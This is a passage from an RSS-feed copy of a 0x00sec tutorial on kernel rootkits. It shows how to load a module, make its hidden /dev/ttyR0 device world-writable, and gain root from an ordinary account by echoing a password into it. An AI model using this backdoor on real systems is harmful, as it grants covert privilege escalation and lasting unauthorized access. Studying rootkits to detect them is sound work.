<p>First open a terminal to monitor the kernel log</p>
<pre><code>$ tail -f /var/log/kern.log
</code></pre>
<p><em>(The kernel log may be in a different file in your system. Check your distro documentation)</em></p>
<p>Then we can load the module</p>
<pre><code>sudo insmod ./root.ko
</code></pre>
<p>The log window will shown the initialisation messages and a new device will pop up under the <code>/dev</code> folder. Something called <code>/dev/ttyR0</code>. If you list the folder you will find a bunch of <code>ttySOMETHING</code> in there… our character device will be difficult to spot at first glance (we will see how to completely hide it a future instalment… hopefully).</p>
<p>By default the device is only accessible by root so we need to change the permissions after loading our module</p>
<pre><code>$ sudo chmod 0666 /dev/ttyR0
</code></pre>
<p>Another interesting exercise is to modify the module so the device is created with the permissions we want.</p>
<p>Now we can use our root backdoor at any time from any terminal or program:</p>
<pre><code>$ id
uid=1000(pico) gid=1000(pico) groups=1000(pico)
$ echo "g0tR0ot" &gt; /dev/ttyR0
$ id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>There is a lot of things you can try out of this simple example… So, what are you waiting for?</p>
<p>Hack Fun</p>
          <p><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485/1</link>
        <pubDate>Tue, 24 Jan 2017 18:29:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1485-1</guid>
        <source url="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485.rss">Kernel RootKits. Getting your hands dirty</source>
      </item>
  </channel>
</rss>
